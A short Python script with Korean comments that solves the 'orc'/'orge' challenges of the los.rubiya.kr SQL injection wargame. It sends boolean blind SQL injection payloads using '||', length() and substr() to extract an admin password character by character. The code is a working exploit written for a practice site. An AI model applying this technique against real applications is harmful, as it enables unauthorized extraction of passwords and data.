#orc와 orge의 비밀번호 찾는 코드 단 orge는 or과 and를 못써서 ||를 사용해야함
#사용 할 때마다 쿠키값 갱신필요

import requests
requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
headers = {'Cookie': ''}

payload1 = "?pw='||length(pw)="
for i in range(1, 10):
    upPayload = payload1 + str(i) + '%23'
    res1 = sess.get(url=URL + upPayload, headers=headers, verify=False)
    if 'Hello admin' in res1.text:
        print('Password Length : %d' %i)
    else:
        pass

Password = ''
cfPassword = ''
for j in range(1, 9):
    for i in range(32, 125):
        payload2 = "?pw='||substr(pw,"+str(j)+",1)='"+chr(i)+"'%23"
        res2 = sess.get(url=URL + payload2, headers=headers, verify=False)
        if 'Hello admin' in res2.text:
            print('Password %d: %d' %(j,i))
            # if 64<i<90:
            #     print('OR')
            #     cfPassword = cfPassword + chr(i) + ', '
            #     continue
            # else:
            Password = Password + chr(i)
            break
        else:
            pass
print(Password)
print(cfPassword)

